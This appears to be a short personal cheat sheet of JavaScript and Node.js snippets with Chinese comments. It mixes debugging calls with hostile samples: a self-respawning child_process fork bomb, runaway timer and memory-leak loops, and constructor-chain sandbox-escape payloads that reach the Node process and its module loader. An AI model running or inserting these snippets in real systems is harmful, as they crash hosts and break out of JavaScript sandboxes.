navigator.userAgent     // 查看内核
Object.getOwnPropertyNames()    // 查看方法
Object.keys()                   // ??

console.trace(aa)       // 追踪方法,变量

(new Error()).stack       // 查看栈

                        // node ???
(function f(){
    require('child_process').spawn(process.argv[0],['-e','('+f.toString()+'());']);
    require('child_process').spawn(process.argv[0],['-e','('+f.toString()+'());']);
}())

                        // 死循环
const a=()=>{
    setTimeout(a,0)
    setTimeout(a,0)
}
a()


console.log(process.ENV)    // node

selfkill    // node


restart     // node

                        // 死循环
function thisWillLeak(){
    var allName = []
    var emoji = 'aa'
    return name =>{
        allName.push(name)
        return emoji+name
    }

}
var leak = thisWillLeak()
while(true) leak('hi')

                // 漏洞 ???
this.constructor.constructor('return process')().exit()

                // xss ??
new Function("return (this.constructor.constructor('return(this.process.mainModule.constructor._load)')())")()('util').inspect('hi')

